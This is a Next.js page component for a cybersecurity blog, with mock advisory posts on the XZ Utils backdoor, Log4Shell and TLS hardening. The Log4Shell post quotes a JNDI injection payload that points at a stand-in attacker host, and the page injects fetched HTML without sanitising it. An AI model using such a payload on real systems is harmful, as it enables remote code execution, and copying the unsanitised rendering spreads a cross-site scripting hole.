"use client";

import React, { useState, useEffect } from "react";
import Navbar from "@/components/dashboard/Navbar";
import Link from "next/link";
import { useParams } from "next/navigation";
import { ArrowLeft, Calendar, Clock, ShieldCheck, Activity } from "lucide-react";

const MOCK_POSTS_DETAILS = {
  "xz-utils-backdoor-analysis": {
    title: "The XZ Utils Backdoor: Analysis and Prevention",
    content: `
### Background
On March 29, 2024, developer Andres Freund announced the discovery of a malicious backdoor embedded inside the upstream tarballs of the xz compression tools. This vulnerability is indexed as CVE-2024-3094 with a critical CVSS score of 10.0.

### Attack Vector
The backdoor was introduced through a series of complex, multi-stage build obfuscations designed to inject a prebuilt binary object from a disguised test file into the compiled library. The target of this backdoor is SSH daemon logins, where authentication hooks are intercepted to execute arbitrary code commands payload streams sent over SSH.

### Remediation
- Downgrade the system liblzma/xz library package to an uncompromised version (prior to 5.6.0).
- Audit active connection handshakes.
- Monitor execution processes originating from public-facing SSH tunnels.
    `,
    readingTime: "8 min read",
    createdAt: "2024-03-30T09:00:00.000Z",
    category: "Supply Chain",
    tags: ["Backdoor", "SSH", "Linux"]
  },
  "understanding-log4shell-rce": {
    title: "Understanding Log4Shell: The Anatomy of a Critical JNDI RCE",
    content: `
### Background
In December 2021, a critical remote code execution vulnerability in Apache Log4j2 was publically disclosed as CVE-2021-44228. This JNDI-based injection vulnerability has a CVSS v3 score of 10.0.

### Attack Vector
The issue occurs when Log4j2 attempts to parse recursive variable lookups. An attacker can construct log payloads containing LDAP URLs (e.g. \`\${jndi:ldap://attacker.com/a}\`). When parsed, Log4j connects to the attacker directory server and dynamically executes the returned class file.

### Remediation
- Keep Log4j2 updated to version 2.17.1 or higher.
- Set environment variables to block format lookups (\`LOG4J_FORMAT_MSG_NO_LOOKUPS=true\`).
- Remove the JndiLookup class file from the classpath library.
    `,
    readingTime: "12 min read",
    createdAt: "2021-12-12T10:00:00.000Z",
    category: "Web Security",
    tags: ["RCE", "Java", "Log4j"]
  },
  "securing-tls-ssl-configurations": {
    title: "Securing TLS/SSL Certificate Chains on Web Hosts",
    content: `
### Background
Modern internet security relies on secure TLS session agreements. Weak configurations open systems to Man-in-the-Middle (MitM) attacks and data interception.

### Hardening Guidelines
1. **Disable Legacy Protocols**: Ensure SSLv3, TLS 1.0, and TLS 1.1 are disabled. Require TLS 1.2 and TLS 1.3.
2. **Hardened Cipher Selection**: Use only AEAD ciphers such as AES-GCM or CHACHA20-POLY1305. Disable CBC mode ciphers.
3. **Key Exchange Mechanisms**: Implement Elliptic Curve Diffie-Hellman (ECDHE) with key sizes above 2048-bits.
4. **Certificate Transparency**: Verify that intermediate certificate chains resolve correctly without certificate gaps.

### Auditing
Run regular handshake tests against port 443 endpoints using our built-in SSL Check operations center.
    `,
    readingTime: "5 min read",
    createdAt: "2023-11-05T14:30:00.000Z",
    category: "Hardening",
    tags: ["SSL", "TLS", "Certificates"]
  }
};

export default function BlogPostPage() {
  const params = useParams();
  const slug = params?.slug as string;

  const [post, setPost] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(false);

  useEffect(() => {
    if (!slug) return;

    const fetchPost = async () => {
      setLoading(true);
      setError(false);
      try {
        const res = await fetch(`/api/blog?slug=${slug}`);
        if (res.ok) {
          const data = await res.json();
          if (data && data.title) {
            setPost(data);
          } else {
            // Check fallback in mock details
            const fallback = MOCK_POSTS_DETAILS[slug as keyof typeof MOCK_POSTS_DETAILS];
            if (fallback) {
              setPost({
                ...fallback,
                slug,
                categories: [{ name: fallback.category }],
                tags: fallback.tags.map(t => ({ name: t }))
              });
            } else {
              setError(true);
            }
          }
        } else {
          // Check fallback in mock details on API failure
          const fallback = MOCK_POSTS_DETAILS[slug as keyof typeof MOCK_POSTS_DETAILS];
          if (fallback) {
            setPost({
              ...fallback,
              slug,
              categories: [{ name: fallback.category }],
              tags: fallback.tags.map(t => ({ name: t }))
            });
          } else {
            setError(true);
          }
        }
      } catch (err) {
        console.error("Failed to retrieve live blog advisory:", err);
        // Check fallback on network exception
        const fallback = MOCK_POSTS_DETAILS[slug as keyof typeof MOCK_POSTS_DETAILS];
        if (fallback) {
          setPost({
            ...fallback,
            slug,
            categories: [{ name: fallback.category }],
            tags: fallback.tags.map(t => ({ name: t }))
          });
        } else {
          setError(true);
        }
      } finally {
        setLoading(false);
      }
    };

    fetchPost();
  }, [slug]);

  if (loading) {
    return (
      <div className="min-h-screen bg-[#080C14] text-slate-100 flex flex-col scanline">
        <Navbar />
        <main className="flex-1 max-w-4xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-16 flex flex-col items-center justify-center space-y-4">
          <Activity className="w-8 h-8 text-cyan-400 animate-spin" />
          <p className="text-xs font-mono text-cyan-400 animate-pulse uppercase tracking-widest">
            RETRIEVING LIVE THREAT INTELLIGENCE DOSSIER...
          </p>
        </main>
      </div>
    );
  }

  if (error || !post) {
    return (
      <div className="min-h-screen bg-[#080C14] text-slate-100 flex flex-col justify-center items-center scanline">
        <div className="text-center space-y-4 font-mono text-xs">
          <ShieldCheck className="w-8 h-8 text-red-500 mx-auto" />
          <p className="text-red-400">CLASSIFIED THREAT BULLET FILE NOT FOUND</p>
          <Link href="/blog" className="inline-block text-cyan-400 hover:underline">
            [RETURN TO POST BULLETINS]
          </Link>
        </div>
      </div>
    );
  }

  const isLivePost = !!post.fullContent;

  return (
    <div className="min-h-screen bg-[#080C14] text-slate-100 flex flex-col scanline">
      <Navbar />

      <main className="flex-1 max-w-4xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        
        <div>
          <Link href="/blog" className="inline-flex items-center gap-1 font-mono text-xs text-slate-400 hover:text-cyan-400 transition font-bold">
            <ArrowLeft className="w-4 h-4" />
            <span>RETURN TO INTEL INDEX</span>
          </Link>
        </div>

        <article className="cyber-panel p-8 rounded-lg space-y-6">
          
          <div className="space-y-3 border-b border-slate-800 pb-6">
            <div className="flex gap-4 items-center text-[10px] font-mono text-slate-500">
              <span className="text-[#00E5FF] uppercase font-bold">{post.categories?.[0]?.name || "CISA Intel"}</span>
              <span>•</span>
              <span className="flex items-center gap-1"><Calendar className="w-3.5 h-3.5" />{new Date(post.createdAt).toLocaleDateString()}</span>
              <span>•</span>
              <span className="flex items-center gap-1"><Clock className="w-3.5 h-3.5" />{post.readingTime}</span>
            </div>
            
            <h1 className="text-xl md:text-2xl font-mono font-black text-white leading-tight">
              {post.title}
            </h1>

            <div className="flex flex-wrap gap-2 pt-2">
              {post.tags?.map((tag: any) => (
                <span key={tag.name} className="px-2 py-0.5 bg-slate-900 border border-slate-700/60 rounded text-[9px] font-mono text-slate-400">
                  #{tag.name}
                </span>
              ))}
            </div>
          </div>

          {/* Render parsed live HTML or pre-line static text */}
          {isLivePost ? (
            <div 
              className="font-mono text-xs text-slate-300 leading-relaxed space-y-4 select-all live-html-feed"
              dangerouslySetInnerHTML={{ __html: post.fullContent }}
            />
          ) : (
            <div className="font-mono text-xs text-slate-300 leading-relaxed whitespace-pre-line space-y-4 select-all">
              {post.content}
            </div>
          )}

          <div className="border-t border-slate-800 pt-6 mt-12 flex items-center justify-between text-[9px] font-mono text-slate-500">
            <span>SOURCE: ARCHITECT INTEGRITY MODULE // CISA INTEL FEED</span>
            <span>VERIFIED DIGITAL SIGNATURE: OK</span>
          </div>

        </article>

      </main>
    </div>
  );
}
export const runtime = "nodejs";
